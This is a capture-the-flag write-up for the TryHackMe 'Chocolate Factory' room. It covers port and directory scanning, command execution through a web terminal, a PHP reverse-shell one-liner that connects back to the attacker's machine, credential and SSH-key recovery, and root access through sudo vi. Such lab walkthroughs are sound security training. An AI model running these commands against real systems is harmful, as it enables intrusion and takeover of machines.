# [Chocolate Factory](https://tryhackme.com/room/chocolatefactory)

<a href="https://tryhackme.com/room/chocolatefactory"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/chocolatefactory), made by [0x9747](https://tryhackme.com/p/0x9747), [saharshtapi](https://tryhackme.com/p/saharshtapi) and [AndyInfoSec](https://tryhackme.com/p/AndyInfoSec).

Dificulty: `Easy`

Solved in: `2026/04/20`

# Table of Contents

- [Chocolate Factory](#chocolate-factory)
- [Table of Contents](#table-of-contents)
- [Writeup](#writeup)
   * [Summary](#summary)
   * [Reconnaissance](#reconnaissance)
   * [Exploration](#exploration)
   * [Privilege Escalation](#privilege-escalation)
   * [Final Considerations](#final-considerations)

# Writeup

## Summary

Using hidden information within binaries, it is possible to invade the chocolate factory and get its keys.

## Reconnaissance

Before starting everything (and after starting the machine) I added `cf.net` to the file `/etc/hosts` for easier access of the machine's IP. To see if all is right:

```bash
$ ping -c 3 cf.net
PING cf.net (<MACHINE_IP>) 56(84) bytes of data.
64 bytes from cf.net (<MACHINE_IP>): icmp_seq=1 ttl=62 time=224 ms
64 bytes from cf.net (<MACHINE_IP>): icmp_seq=2 ttl=62 time=660 ms
64 bytes from cf.net (<MACHINE_IP>): icmp_seq=3 ttl=62 time=375 ms

--- cf.net ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 223.630/419.378/659.769/180.829 ms
```

With that, I followed the default procedures. That is, since I only got an address, the first thinf to do is seeing which available ports are around with `nmap`:[^nmap]

```bash
$ nmap -T4 cf.net
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-20 12:41 UTC
Nmap scan report for cf.net (<MACHINE_IP>))
Host is up (0.21s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 3.48 seconds
```

Woah! That's a ton! I decided to go simple with `http`...

<figure><img src="./assets/squirrel.png" title="index.html"></figure>

Just a login page, with user and password fields. Well, from there I used `gobuster`[^gobuster] with one of the default kali wordlists[^wl-dirl23med] to verify if other pages existed:

```bash
$ gobuster dir -u cf.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1466]
/home.php             (Status: 200) [Size: 569]
/validate.php         (Status: 200) [Size: 93]
```

That gave me `./index.html` (the login page), `/home.php` and `/validate.php`. While `/validate.php` is just the script for submitting the form in `/index.html`, `/home.php` proved far more interesting:

<figure><img src="./assets/terminal.png" title="home.php"></figure>

A commandline! Immediately I started to throw in some commands...

```bash
$ whoami
www-data

$ ls
home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php
```

Though, when I used `cd ..` I discovered the terminal enters timeout if no answer is given from a command. I had to restart the whole machine because of it! Though doing something like `cd .. ; echo "a"` is enough a bypass for this.

That said, since the environment is so extremely restrictive, I decided to make a reverse shell.[^rv]

## Exploration

Making a revshell[^rv] here was a trial and error endeavor. I tried many a models for `bash` available at [revshells.com](https://www.revshells.com/) though none worked. The alternative was, then, `php`, since the server had it installed (`/validate.php`).

So, with `netcat`[^nc] set on my machine:

```bash
$ nc -lvnp 1234
```

I sent the command to the server:

```bash
$ php -r '$sock=fsockopen("<MY_MACHINE>",1234);exec("sh <&3 >&3 2>&3");'
```

Bingo! Revshell acquired. Now, with more liberty, I tried exploring deeper. First on the line, the executable `key_rev_key` had something. Separating the strings from the binary:

```bash
$ strings validate.php
...
AUATL
[]A\A]A^A_
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'<FLAG_1>'
 Keep its safe
Bad name!
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
...
```

That answers the first task.
- Q: Enter the key you found! A: b'<FLAG_1>'

Still within this directory, I did the same with `validate.php` and learned of charlie's password.

```bash
$ strings validate.php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="<FLAG_2>"){
                echo "<script>window.location='home.php'</script>";
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
```

- Q: What is Charlie's password? A: <FLAG_2>

Great! Now, I could access the login at `/index.html`! Unfortunately, as we can see in the code, it only really takes us back to `/home.php`. So back to exploring it is.

```bash
$ pwd
/home/charlie
$ ls
teleport
teleport.pub
user.txt
```

I did get quite excited here and ended up ignoring `user.txt` in favor of the RSA keys. `teleport` is the private key, while `teleport.pub` the public one, which probably means they grant access to the `ssh` port!

```bash
$ cat teleport
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----

$ cat teleport.pub
ssh-rsa ... charlie@chocolate-factory
```

With the files locally saved, I used another terminal to login on `ssh`:

```bash
$ ssh -i teleport charlie@cf.net

charlie@ip-<MACHINE_IP>:/$ whoami
charlie
```

- C: change user to charlie

Great! With direct access to the machine, I finally open `user.txt`:

```bash
charlie@ip-<MACHINE_IP>:/home/charlie$ cat user.txt
<FLAG_USER>
```

- Q: Enter the user flag. A: <FLAG_USER>

## Privilege Escalation

To start off, I usually like doing `sudo -l` to check for permissions:

```bash
charlie@ip-<MACHINE_IP>:/$ sudo -l
Matching Defaults entries for charlie on ip-<MACHINE_IP>:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-<MACHINE_IP>:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Since `/usr/bin/vi` is with passwordless privileges, just need to use one of the many available commands in [GTFObins](https://gtfobins.org/) to remove the restrictions:

```bash
charlie@ip-<MACHINE_IP>:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
# whoami
root
```

Alas, now we find the root flag...

```bash
# pwd
/root
# ls
root.py  snap
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

And unfortunately it looks like it is cyphered above another layer. Since the machine didn't have python for running this code, I decided to use [CyberChef](https://gchq.github.io/CyberChef/) instead:

<figure><img src="./assets/flag3.png" title="CyberChef"></figure>

Just set the cypher as Fernet, use the key found back at the start of the machine and the cyphered text within `root.py`.

- Q: Enter the root flag A: <FLAG_ROOT>

## Final Considerations

At the machine's task page in Try Hack Me there's a golden ticket with a hash-like name (probably MD4 or MD5): `01869e0b2238d8307020d2c4503cec51.jpg`.

<figure><img src="./assets/01869e0b2238d8307020d2c4503cec51.jpg" title="Golden ticket"></figure>

Also, while exploring, I did enter the `ftp` port and only found this image:

<figure><img src="./assets/gum_room.jpg" title="Gum room"></figure>

These and the many open ports lead me to believe there is a second solution to this machine.

[^nmap]: https://github.com/nmap/nmap
[^gobuster]: https://github.com/OJ/gobuster
[^wl-dirl23med]: https://gitlab.com/kalilinux/packages/dirbuster/-/blob/37f2e9bb1c50bee238aa50d795cf853bb28b2997/directory-list-2.3-medium.txt
[^nc]: https://nc110.sourceforge.io/
[^rv]: https://en.wikipedia.org/wiki/Shell_shoveling